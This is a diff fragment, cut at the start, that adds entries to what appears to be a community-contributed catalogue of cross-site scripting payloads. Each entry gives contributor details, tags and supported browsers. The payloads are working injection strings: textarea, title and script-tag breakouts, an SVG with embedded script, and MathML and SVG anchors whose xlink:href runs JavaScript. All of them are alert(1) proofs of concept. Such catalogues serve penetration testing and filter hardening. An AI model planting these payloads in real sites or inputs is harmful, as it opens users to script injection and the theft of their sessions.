+    description: "Script tag breakout - closes existing script context and opens new one"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["script-breakout", "context-escape", "closing-tag", "injection"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "javascript"
+    date_added: "06-06-2026"
+
+  - code: |
+      </textarea><script>alert(1)</script>
+    description: "Textarea breakout - escapes from textarea context to inject script"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["textarea-breakout", "context-escape", "closing-tag", "injection"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      </title><script>alert(1)</script>
+    description: "Title tag breakout - escapes from title context to inject script"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["title-breakout", "context-escape", "closing-tag", "head-injection"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+    description: "SVG with xmlns and embedded script - inline script execution within SVG namespace"
+    category: "advanced"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["svg", "xmlns", "embedded-script", "namespace"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <math><maction actiontype="statusline" xlink:href="javascript:alert(1)">CLICK</maction></math>
+    description: "MathML maction with xlink:href - XSS through MathML action element"
+    category: "advanced"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["mathml", "maction", "xlink", "namespace"]
+    browsers: ["Firefox"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><circle r=100/></a></svg>
+    description: "SVG anchor with xlink namespace - clickable SVG element with JavaScript href"
+    category: "advanced"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["svg", "anchor", "xlink", "namespace", "clickable"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
